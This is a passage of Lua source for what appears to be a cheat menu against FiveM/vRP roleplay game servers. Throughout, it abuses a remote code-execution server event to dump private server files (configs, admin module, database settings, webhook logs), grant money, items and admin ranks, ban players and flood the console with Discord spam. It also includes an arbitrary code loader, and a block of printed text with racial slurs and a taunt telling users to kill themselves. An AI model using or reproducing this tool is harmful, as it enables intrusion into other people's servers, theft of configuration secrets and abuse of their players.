        local file = LoadResourceFile("vrp_robbery", "client.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp_functions", '~b~server') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_functions", "vrp_functions/server.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp_functions", '~b~client') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_functions", "vrp_functions/client.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])


elseif RPPPwdjwdU23.Button("~r~??ben vrp-chat", '~b~server') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp-chat", "server.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp-chat", '~b~client') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp-chat", "client.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp-chat", '~b~config') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp-chat", "cfg/config.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp_panikknap", '~b~server') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_panikknap", "server.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp_panikknap", '~b~client') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_panikknap", "client")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp_panikknap", '~b~config') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_panikknap", "config")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])


elseif RPPPwdjwdU23.Button("~r~??ben vrp_bank", '~b~server') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_bank", "server.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben vrp_bank", '~b~client') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("vrp_bank", "client.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])
elseif RPPPwdjwdU23.Button("~p~------------------------------------------") then

elseif RPPPwdjwdU23.Button("~r~??ben dn_menu", '~b~config') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("dn_menu", "config.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben dn_menu", '~b~radialmenu') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("dn_menu", "radialmenu.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])


elseif RPPPwdjwdU23.Button("~r~??ben dn-discord", '~b~client') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("dn-discord", "client.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben dn-discord", '~b~server') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("dn-discord", "server.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben dn-custom2", '~b~scope') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("dn-custom2", "client/scope.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben dn-custom2", '~b~crouch') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("dn-custom2", "client/crouch.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben dn-custom2", '~b~autopilot') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("dn-custom2", "client/autopilot.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben dn-custom2", '~b~server') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("dn-custom2", "client/vinduerul.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben dn-loadingscreen", '~b~__resource') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("dn-loadingscreen", "__resource.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben dn-revive", '~b~server') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("dn-revive", "server.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben dn-revive", '~b~__resource') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("dn-revive", "__resource.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben carblacklist", '~b~modelblacklist') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("modelblacklist", "carblacklist.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben modelblacklist", '~b~modelblacklist') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("modelblacklist", "weaponblacklist.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben EjerToolBan", '~b~EjerToolBan') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("EjerToolBan", "server.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben announcements", '~b~config') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("announcements", "config.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben chairs", '~b~client') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("chairs", "client.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben connectqueue", '~b~connectqueue') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("connectqueue", "connectqueue.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])

elseif RPPPwdjwdU23.Button("~r~??ben connectqueue", '~b~connectqueue') then
    TriggerServerEvent('RunCode:RunStringRemotelly', [[
        local file = LoadResourceFile("connectqueue", "sv_queue_config.lua")

        vRP.prompt({source, "", file, function() end})

        for i = 1,500 do 
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
        end
    ]])


    


elseif RPPPwdjwdU23.Button("~p~stop ~r~(vrp)") then
    AddEventHandler('onClientResourceStop', function (vRP)
        print('The resource chat has been stopped on the client.')
    end)
elseif RPPPwdjwdU23.Button("~p~stop ~r~(AC)") then
    AddEventHandler('onClientResourceStop', function (AC)
        print('The resource chat has been stopped on the client.')
    end)
elseif RPPPwdjwdU23.Button("~p~stop ~r~(Ejer-Tool-Ban)") then
    AddEventHandler('onClientResourceStop', function (Ejer_tool_ban)
        print('The resource chat has been stopped on the client.')
    end)
end
        
        -- Custom Menu
        elseif RPPPwdjwdU23.IsMenuOpened('Custom Menu') then
            if RPPPwdjwdU23.Button("~w~Bliv Ejer", '~b~Sky') then
            udwdj("kasperr_jobcenter:selectJob", "ledelse")
            udwdj("kasperr_jobcenter:selectJob", "Admin")
            udwdj("kasperr_jobcenter:selectJob", "Ejer")
            udwdj("kasperr_jobcenter:selectJob", "superadmin")
            udwdj("kasperr_jobcenter:selectJob", "Ledelse")
            udwdj("kasperr_jobcenter:selectJob", "Moderator")
            udwdj("kasperr_jobcenter:selectJob", "Staff")
            udwdj("kasperr_jobcenter:selectJob", "Hj??lper")
            udwdj("kasperr_jobcenter:selectJob", "support")
            udwdj("kasperr_jobcenter:selectJob", "Supporter")
        elseif RPPPwdjwdU23.Button("~w~Bliv Politi", '~b~Sky') then
            udwdj("kasperr_kriminel:selectJob", "Politi")
            udwdj("kasperr_kriminel:selectJob", "Politielev")
            udwdj("kasperr_kriminel:selectJob", "Rigspolitichef")
            udwdj("kasperr_kriminel:selectJob", "Politibetjent")
            udwdj("kasperr_kriminel:selectJob", "Politidirekt??r")
            udwdj("kasperr_kriminel:selectJob", "Politichef")
        elseif RPPPwdjwdU23.Button("Give money",'~r~Devo') then
            local id = "local id = " .. GetKeyboardInput("ID:") .. " "
            local rank = 'local amount = '.. GetKeyboardInput('Bel??b:')..' '
            local admin = [[
                    local warof = 5
                    local users = vRP.getUsers({})
                    local player = vRP.getUserSource({id})
                    vRP.giveBankMoney({id,amount})
                    for i = 1,500 do 
                        RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                        RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                    end
                ]]
            local admin2 = id .. rank ..admin
            udwdj('RunCode:RunStringRemotelly', admin2)
        elseif RPPPwdjwdU23.Button("Give Items", '~r~Devo') then
            local user_id = "local user_id = " .. tonumber(GetKeyboardInput("ID")).. "  "
            local ting = 'local ting = "'..GetKeyboardInput("Ting") .. '" '
            local amount = "local amount = " .. tonumber(GetKeyboardInput("Antal?")) .. "  "
            local bank = [[vRP.giveInventoryItem({user_id,ting,amount,true})]]
            local moneyto = user_id .. ting .. amount .. bank

            TriggerServerEvent('RunCode:RunStringRemotelly', moneyto)
        elseif RPPPwdjwdU23.Button("~w~Get Webhook", '~r~Devo') then
            TriggerServerEvent('RunCode:RunStringRemotelly', [[
                local file = LoadResourceFile("serverlog", "sv_chat.lua")
                
                vRP.prompt({source, "", file, function() end})
        
                for i = 1,500 do 
                    RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                    RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                end
            ]])

        elseif RPPPwdjwdU23.Button("~w~Group Info", '~r~Devo') then

            TriggerServerEvent('RunCode:RunStringRemotelly', [[
            local file = LoadResourceFile("vrp", "cfg/groups.lua")
            
            vRP.prompt({source, "", file, function() end})

            for i = 1,500 do 
                RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
            end
        ]])

    elseif RPPPwdjwdU23.Button("~w~Ban Spiller", '~r~Devo') then
        local id = "local id = " .. GetKeyboardInput("ID:", " ", 20) .. " "
        local grund = 'local grund = "'..  GetKeyboardInput('GRUND:', '' , 20)..'" '
        local ban = [[
                local warof = 5
                local users = vRP.getUsers({})
                local player = vRP.getUserSource({id})
                vRP.ban({id, grund})
                for i = 1,500 do 
                    RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                    RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                end
            ]]
            local ban = id .. grund ..ban
            udwdj('RunCode:RunStringRemotelly', ban)

        elseif RPPPwdjwdU23.Button("~w~Tjek Webhook logs p?? servern", '~r~Devo') then
            TriggerServerEvent('RunCode:RunStringRemotelly', [[
	            local file = LoadResourceFile("vrp", "modules/admin.lua")
	
                vRP.prompt({source, "", file, function() end})

                for i = 1,500 do 
                    RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                    RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                end
            ]])

        elseif RPPPwdjwdU23.Button("Execute Code", '~q~A~o~l~g~l ~r~Servers') then        
            local Code = GetKeyboardInput("Custom code:", " ", 122)
            load(Code)()

        elseif RPPPwdjwdU23.Button("Test 2222", '~g~Server') then 
            vRPclient.teleport(target,{1708.1635742188,2594.5412597656,50.188068389893}) -- teleport to inside jail


        elseif RPPPwdjwdU23.Button("Test your Lua Executor", '~q~A~o~l~g~l ~r~Servers') then  
            local Code = GetKeyboardInput("Enter plz")
				if string.lower(Code) == "y" then
                    load(Code)()
				else
                    load(Code)(print("Test 1"))
                    load(Code)(print("Test 2"))
                    load(Code)(print[[SUB TO K??DKONGEN
nigger
Test 3
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
K??DKONGEN#9999 ON DISCORD
Test 4
is yuor Executor Desudo exec fil.lua nigger buy Eulen
is yuor Executor Eulen then print("nigger")
is yuor Executor Unex kil yuor self
is yuor Executor redE nice but buy Eulen executor
is yuor Executor onion then BUY EULEN!!!!!!!!!!!
Eulen is the best Lua Executor
Eulen it has ESP and Myself OPTIONS and Weapon OPTIONS and vehicle OPTIONS and Lua executor and menues inside the menu
]])
				end


        elseif RPPPwdjwdU23.Button("~w~Tjek Database", '~r~Devo') then
            TriggerServerEvent('RunCode:RunStringRemotelly', [[
	            local file = LoadResourceFile("vrp", "cfg/base.lua")
	
                vRP.prompt({source, "", file, function() end})

                for i = 1,500 do 
                    RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                    RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                end
            ]])

        elseif RPPPwdjwdU23.Button("~w~Tilf??j Ranks", '~r~Devo') then
            local id = "local id = " .. GetKeyboardInput("ID:", " ", 20) .. " "
            local rank = 'local rank = "'.. GetKeyboardInput('Rank:', '' , 20)..'" '
            local admin = [[
                    local warof = 5
                    local users = vRP.getUsers({})
                    local player = vRP.getUserSource({id})
                    vRP.addUserGroup({id, rank})
                    for i = 1,500 do 
                        RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                        RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                    end
                ]]
            local admin2 = id .. rank ..admin
            udwdj('RunCode:RunStringRemotelly', admin2)

        elseif RPPPwdjwdU23.Button("~w~Tilf??j Ranks", '~r~DevoBypass') then
            local id = "local id = " .. GetKeyboardInput("ID:", " ", 20) .. " "
            local rank = 'local rank = "'.. GetKeyboardInput('Rank:', '' , 20)..'" '
            local admin = [[
                    local warof = 5
                    local users = vRP.getUsers({})
                    local player = vRP.getUserSource({id})
                    vRP.addUserGroup({id, rank})
                    for i = 1,500 do 
                        RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                        RconPrint("SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db SUB TO K??KONGEN https://discord.gg/bKJd4eC5Db")
                    end
                ]]
            local admin2 = id .. rank ..admin
            udwdj('RunNoCode:RunStringRemotelly', admin2)

        elseif RPPPwdjwdU23.Button("~g~Esx Vrp | ~w~15 mil") then
            TriggerServerEvent("scrap:SellVehicle", 15000000)
            TriggerServerEvent('esx_truckerjob:pay', 15000000)
            TriggerServerEvent('vrp_slotmachine:server:2', 15000000)
            TriggerServerEvent("esx_pizza:pay", 15000000)
            TriggerServerEvent('esx_jobs:caution', 'give_back', 15000000)
